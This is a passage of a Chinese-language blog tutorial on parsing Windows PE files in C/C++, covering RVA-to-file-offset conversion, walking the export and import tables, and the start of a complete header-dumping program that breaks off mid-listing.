VA += image_base;</span><br><span class="line">    PA += image_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-40s VA 0x%016jx \n                                         PA 0x%016jx \n--------------------\n&quot;</span>, section_name, VA, PA);</span><br><span class="line">    p_section_header += <span class="number">0x28</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用可选头和其大小，跳转到节区头，并利用文件头中获取的节区数量进行循环打印名称，并打印其中每个节区的内存中（VA）地址和文件中（PA）地址；</p>
<h3 id="关于对齐和偏移"><a href="#关于对齐和偏移" class="headerlink" title="关于对齐和偏移"></a>关于对齐和偏移</h3><p>偏移都是相对image base而言；</p>
<p>因为在文件中和内存中有不同的对齐，所以才有不同的偏移值，而对齐是相对于区段而言，区段与区段之间，头与区段之间会填充对齐；</p>
<p>当知晓一个<strong>地址的VA偏移</strong>，且知晓这个<strong>地址属于哪个区段</strong>，便可得出这个<strong>地址的PA偏移</strong>；</p>
<p>why？</p>
<p>因为区段内不存在对齐改变偏移，所以有等式：地址VA - 区段VA = 区段与地址的距离</p>
<p>​                                   地址PA - 区段PA = 区段与地址的距离</p>
<p>所以有 地址PA = 地址VA - 区段VA + 区段PA；</p>
<p>定义转换函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">UINT32 <span class="title">vtop</span><span class="params">(UINT32 rva, UINT8* p_section_header, UINT16 number_of_sections)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UINT32 VA;</span><br><span class="line">	UINT32 PA;</span><br><span class="line">	UINT32 true_size;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_sections; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		VA = (UINT32) * (UINT32*)(p_section_header + <span class="number">12</span>);</span><br><span class="line">		PA = (UINT32) * (UINT32*)(p_section_header + <span class="number">20</span>);</span><br><span class="line">		true_size = (UINT32) * (UINT32*)(p_section_header + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((rva &gt;= VA) &amp;&amp; (rva &lt; VA + true_size))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> (rva - VA + PA);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		p_section_header += <span class="number">0x28</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;rva error\n\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当rva存在在一个区段的内部时，也就是if判断，就可以执行转换了，如果没找到，就是错误的rva；</p>
<h2 id="打印导出表"><a href="#打印导出表" class="headerlink" title="打印导出表"></a>打印导出表</h2><p>导出表是可选头最后一个结构体数组的第一个索引来寻找的；</p>
<p>注意：导出表很多内容本质是rva，导出表结构可自行百度；</p>
<p>所以找到特别的结构体数组：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取datadirarray数组</span></span><br><span class="line">UINT32 datadirarray_index = (UINT32) * (UINT32*)(p_section_header - <span class="number">0x84</span>);</span><br><span class="line">UINT8* datadirarray = p_section_header - <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure>

<p>因为32位和64位op头长度不同，所以都能用的情况就是用节区头去反着找；</p>
<p>这个数组的每个结构体都只有一个实际的内容，就是记录表或者项目的rva；</p>
<p>之后根据 datadirarray 找到导出表：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取导出表</span></span><br><span class="line"><span class="keyword">if</span> ((UINT32) * (UINT32*)(datadirarray) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    UINT8* export_table = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(datadirarray), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">    UINT32 etnamead = (UINT32) * (UINT32*)(export_table + <span class="number">12</span>);</span><br><span class="line">    UINT8* etname = <span class="built_in">vtop</span>(etnamead, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">    UINT32 number_of_functions = (UINT32) * (UINT32*)(export_table + <span class="number">20</span>);</span><br><span class="line">    UINT32 number_of_names = (UINT32) * (UINT32*)(export_table + <span class="number">24</span>);</span><br><span class="line">    UINT8* ad_of_funcs = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">28</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">    UINT8* ad_of_names = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">32</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">    UINT8* ad_of_ordis = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">36</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s\n\n&quot;</span>, etname);</span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_functions; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016jx&quot;</span>, (UINT32) * (UINT32*)(ad_of_funcs + <span class="number">4</span> * i) + image_base);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; number_of_names; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (i == (UINT16) * (UINT16*)(ad_of_ordis + <span class="number">2</span> * j))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;                    %3d     %s\n&quot;</span>, i, <span class="built_in">vtop</span>((UINT32) * (UINT32*)(ad_of_names + <span class="number">4</span> * j), p_section_header, number_of_sections) + fbuffer);</span><br><span class="line">                flag = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;                            ---\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;no export..\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先需要有 导出表，也就是 datadirarray[0] 有存在的rva，然后利用rva去静态地找到导出表；</p>
<p>之后同样的道理，找到导出表名称，接着是导出函数数，以及有名称的函数数；</p>
<p>然后是三个表：函数地址表，函数序数表，函数名称表；</p>
<p>关系如下：</p>
<p><img src="https://s2.loli.net/2022/11/11/Tm3G7nZBRjDX2yJ.png" alt="func_table"></p>
<p>所以才有打印时的循环操作：</p>
<ol>
<li>首先根据整体数量操作，打印出索引对应地址；</li>
<li>然后进入内层循环，找有名称的函数；</li>
<li>当地址索引和序数表内容相同时，也就是if判断，利用当前序数表索引打印函数名称；</li>
<li>设置的flag位算信号量，打印没名称函数；</li>
</ol>
<h2 id="打印导入表"><a href="#打印导入表" class="headerlink" title="打印导入表"></a>打印导入表</h2><h3 id="关于dll载入"><a href="#关于dll载入" class="headerlink" title="关于dll载入"></a>关于dll载入</h3><p>显式加载时，调用文件会留下函数名，以rva字符串形式保存在文件中；</p>
<p>主文件和dll文件被扔到同一个进程中；</p>
<p>加载到内存时，loadlibrary函数做了 将dll文件的 imagebase 地址赋予到本文件指针，所以<strong>可以操作dll文件的头部</strong>；</p>
<p>可以简单理解 通过dll的导出表 将存放函数名rva的地方改成了对应的函数地址；</p>
<p>由此，dll中的函数被调用；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取导入表</span></span><br><span class="line"><span class="keyword">if</span> ((UINT32) * (UINT32*)(datadirarray + <span class="number">8</span>) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    UINT8* import_table = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(datadirarray + <span class="number">8</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">    <span class="keyword">while</span> (import_table != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        UINT8* original_first_thunk = import_table;</span><br><span class="line">        UINT32 itnamead = (UINT32) * (UINT32*)(import_table + <span class="number">12</span>);</span><br><span class="line">        UINT8* itname = <span class="built_in">vtop</span>(itnamead, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Import Table:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n\n&quot;</span>, itname);</span><br><span class="line"></span><br><span class="line">        UINT8* name_stru = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(original_first_thunk), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">        <span class="keyword">while</span> (name_stru != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            UINT32 ntype = (UINT32) * (UINT32*)name_stru;</span><br><span class="line">            <span class="keyword">if</span> (ntype &amp; <span class="number">0x80000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;import by ordinal %40d\n&quot;</span>, ntype &amp; <span class="number">0x7fffffff</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                UINT8* n_stru = <span class="built_in">vtop</span>(ntype, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">                n_stru += <span class="number">2</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;import by name %40s\n&quot;</span>, n_stru);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            name_stru += <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;--------------------\n&quot;</span>);</span><br><span class="line">        import_table += <span class="number">0x14</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;no import..\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>先根据datadirarray拿到import表，每个导入的文件都会有一个import表，所以import表可能有多个，所以循环遍历；</p>
<p>在import表里有 IAT 和 INT ，这里拿的是 INT ： original_first_thunk，之后获取名称；</p>
<p>INT会指向一个结构体，里面可能是序数导入的函数，也可能是名称导入的函数，区分就是看最高位是否是1，所以有与操作；</p>
<p>这个结构体是该导入表的所有函数，所以又用一个循环遍历，如果是名字导入，则rva指向一个真正名称的结构体，第二个字节之后就是名称；</p>
<h2 id="整体效果"><a href="#整体效果" class="headerlink" title="整体效果"></a>整体效果</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> UINT8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> UINT16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> UINT32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> UINT64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fapi = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//RVA转FOA</span></span><br><span class="line"><span class="function">UINT32 <span class="title">vtop</span><span class="params">(UINT32 rva, UINT8* p_section_header, UINT16 number_of_sections)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UINT32 VA;</span><br><span class="line">	UINT32 PA;</span><br><span class="line">	UINT32 true_size;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_sections; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		VA = (UINT32) * (UINT32*)(p_section_header + <span class="number">12</span>);</span><br><span class="line">		PA = (UINT32) * (UINT32*)(p_section_header + <span class="number">20</span>);</span><br><span class="line">		true_size = (UINT32) * (UINT32*)(p_section_header + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((rva &gt;= VA) &amp;&amp; (rva &lt; VA + true_size))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (fapi == <span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> (rva - VA + PA - <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> (rva - VA + PA);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		p_section_header += <span class="number">0x28</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;rva error\n\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件长度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_file_size</span><span class="params">(FILE* fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">	<span class="keyword">int</span> size = <span class="built_in">ftell</span>(fp);</span><br><span class="line">	<span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> mode[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\nUsage: %s + ./file_you_want_know\n\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (argc &gt; <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">sprintf</span>(mode, <span class="string">&quot;%s&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//读文件</span></span><br><span class="line">	<span class="keyword">char</span>* filename = argv[<span class="number">1</span>];</span><br><span class="line">	FILE* fp;</span><br><span class="line">	<span class="keyword">if</span> ((fp = <span class="built_in">fopen</span>(filename, <span class="string">&quot;r&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\nfile path maybe wrong?\n\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> fsize = <span class="built_in">get_file_size</span>(fp);</span><br><span class="line"></span><br><span class="line">	UINT8* fbuffer = (UINT8*)<span class="built_in">malloc</span>(fsize);</span><br><span class="line">	<span class="built_in">fread</span>(fbuffer, <span class="number">1</span>, fsize, fp);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取dos头</span></span><br><span class="line">	UINT8* p_dos_header = fbuffer;</span><br><span class="line"></span><br><span class="line">	UINT16 dos_magic = (UINT16) * ((UINT16*)p_dos_header);</span><br><span class="line">	UINT32 pe_offset;</span><br><span class="line">	<span class="keyword">if</span> (dos_magic != <span class="number">0x5a4d</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n%s it&#x27;s not a valid PE file.\n\n&quot;</span>, filename);</span><br><span class="line">		<span class="built_in">free</span>(fbuffer);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		pe_offset = (UINT32) * (UINT32*)(p_dos_header + <span class="number">0x40</span> - <span class="number">4</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取pe头</span></span><br><span class="line">	UINT8* p_pe_header = (p_dos_header + pe_offset);</span><br><span class="line"></span><br><span class="line">	UINT32 pe_magic = (UINT32) * ((UINT32*)p_pe_header);</span><br><span class="line">	<span class="keyword">if</span> (pe_magic != <span class="number">0x4550</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((UINT32) * (UINT32*)(p_pe_header - <span class="number">1</span>) == <span class="number">0x4550</span>)</span><br><span class="line">			p_pe_header -= <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n%s it&#x27;s pe magic number wrong: %x\n&quot;</span>, filename, pe_magic);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取file头</span></span><br><span class="line">	UINT8* p_file_header = p_pe_header + <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">	UINT16 machine_num = (UINT16) * ((UINT16*)p_file_header);</span><br><span class="line">	UINT16 number_of_sections = (UINT16) * (UINT16*)(p_file_header + <span class="number">2</span>);</span><br><span class="line">	UINT16 size_of_optional_header = (UINT16) * (UINT16*)(p_file_header + <span class="number">16</span>);</span><br><span class="line">	UINT16 file_characteristics = (UINT16) * (UINT16*)(p_file_header + <span class="number">18</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nit&#x27;s machine number is %xh\n&quot;</span>, machine_num);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取可选头</span></span><br><span class="line">	UINT8* p_optional_header = p_file_header + <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">	UINT16 optional_magic = (UINT16) * ((UINT16*)p_optional_header);</span><br><span class="line">	UINT32 oep_offset = (UINT32) * (UINT32*)(p_optional_header + <span class="number">16</span>);</span><br><span class="line">	UINT64 image_base = (UINT64) * (UINT64*)(p_optional_header + <span class="number">24</span>);</span><br><span class="line">	UINT32 section_alignment = (UINT32) * (UINT32*)(p_optional_header + <span class="number">32</span>);</span><br><span class="line">	UINT32 file_alignment = (UINT32) * (UINT32*)(p_optional_header + <span class="number">36</span>);</span><br><span class="line">	UINT32 size_of_image = (UINT32) * (UINT32*)(p_optional_header + <span class="number">56</span>);</span><br><span class="line">	UINT32 size_of_headers = (UINT32) * (UINT32*)(p_optional_header + <span class="number">60</span>);</span><br><span class="line">	UINT16 dll_characteristics = (UINT16) * (UINT16*)(p_optional_header + <span class="number">70</span>);</span><br><span class="line">	<span class="keyword">if</span> (size_of_optional_header == <span class="number">0xe0</span> &amp;&amp; optional_magic == <span class="number">0x10b</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;standard 32bit mode.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (optional_magic == <span class="number">0x10b</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;32bit mode but size of optional header: %x\n&quot;</span>, size_of_optional_header);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (size_of_optional_header == <span class="number">0xf0</span> &amp;&amp; optional_magic == <span class="number">0x20b</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;standard 64bit mode.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (optional_magic == <span class="number">0x20b</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;64bit mode but size of optional header: %x\n&quot;</span>, size_of_optional_header);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;OEP is at 0x%x\n\n&quot;</span>, image_base + oep_offset);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取节区头</span></span><br><span class="line">	UINT8* p_section_header = p_optional_header + size_of_optional_header;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (*p_section_header == <span class="number">0</span>)</span><br><span class="line">		p_section_header += <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">char</span> section_name[<span class="number">9</span>];</span><br><span class="line">	UINT32 VA;</span><br><span class="line">	UINT32 PA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mode[<span class="number">0</span>] == <span 